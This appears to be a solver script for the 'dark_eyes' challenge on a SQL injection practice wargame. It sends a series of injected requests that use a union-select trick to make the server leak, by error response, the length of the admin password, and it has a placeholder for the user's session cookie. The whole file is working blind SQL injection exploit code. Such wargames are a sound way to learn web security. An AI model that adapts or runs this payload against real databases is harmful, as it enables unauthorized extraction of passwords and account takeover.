import urllib3
import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

length = 0

for i in range(0,40):
    query = "pw=' or id='admin' and (select 1 union select(length(pw)={}))%23".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    #print(req.text)
    if "select id from prob_dark_eyes" in req.text:
        length = i
        break

print("password length is : ",length)
